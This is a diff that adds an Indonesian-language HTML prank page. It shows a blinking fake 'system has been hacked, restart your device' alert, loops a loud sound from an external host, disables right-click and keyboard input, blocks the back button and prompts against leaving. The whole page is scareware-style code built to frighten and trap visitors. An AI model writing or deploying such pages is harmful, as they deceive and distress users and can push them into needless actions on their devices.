@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>WARNING SYSTEM BREACH</title>
+  <style>
+    body {
+      margin: 0;
+      background: black;
+      color: red;
+      font-family: 'Courier New', monospace;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      text-align: center;
+      padding: 20px;
+    }
+
+    h1 {
+      font-size: 24px;
+      animation: blink 1s infinite alternate;
+    }
+
+    @keyframes blink {
+      0% { opacity: 1; }
+      100% { opacity: 0.3; }
+    }
+
+    audio {
+      display: none;
+    }
+  </style>
+</head>
+<body oncontextmenu="return false" onkeydown="return false">
+
+  <h1>⚠ SISTEM TELAH DIRETAS<br>RESTART PERANGKAT ANDA UNTUK MEMULIHKAN</h1>
+
+  <!-- Sound looping nonstop -->
+  <audio id="prankSound" autoplay loop>
+    <source src="https://files.catbox.moe/2r382n.mp3" type="audio/mpeg">
+  </audio>
+
+  <script>
+    // Paksa suara play saat user klik/tap
+    const audio = document.getElementById('prankSound');
+    function forcePlay() {
+      audio.play().catch(() => {});
+    }
+
+    document.addEventListener('click', forcePlay);
+    document.addEventListener('touchstart', forcePlay);
+    audio.volume = 1;
+
+    // Blok tombol back
+    history.pushState(null, null, location.href);
+    window.onpopstate = function () {
+      history.go(1);
+    };
+
+    // Blok keluar paksa
+    window.onbeforeunload = function () {
+      return \"⚠ Sistem masih aktif! Restart HP anda untuk keluar!\";
+    };
+  </script>
+
+</body>
+</html>
